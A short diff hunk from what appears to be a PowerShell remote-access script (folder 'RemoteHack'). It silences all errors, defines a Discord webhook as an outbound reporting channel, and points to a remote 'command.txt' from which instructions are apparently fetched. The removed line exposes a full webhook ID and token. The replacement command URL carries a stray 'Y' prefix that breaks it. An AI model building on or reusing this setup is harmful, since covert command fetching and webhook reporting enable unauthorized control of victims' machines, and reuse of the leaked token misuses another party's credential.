@@ -4,9 +4,9 @@
 #Hide Errors
 $ErrorActionPreference = 'SilentlyContinue'
 # Define Discord webhook URL
-$hookUrl = "https://discord.com/api/webhooks/1200245949126148156/HOwhnUPElKBeBX7_j3WMG8-jMlimPoAM3pTlc-uZMbCESmAPXdzF7YWq1DEYqxxuroKy"
+$hookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_HOOK_URL_HERE"
 # Define command URL
-$url = "C:\Users\MEIR\Desktop\RemoteHack\command.txt"
+$url = "Yhttps://github.com/YOUR_PATH_TO/command.txt"
 ###/HEAD
 
 ###FUNCTIONS
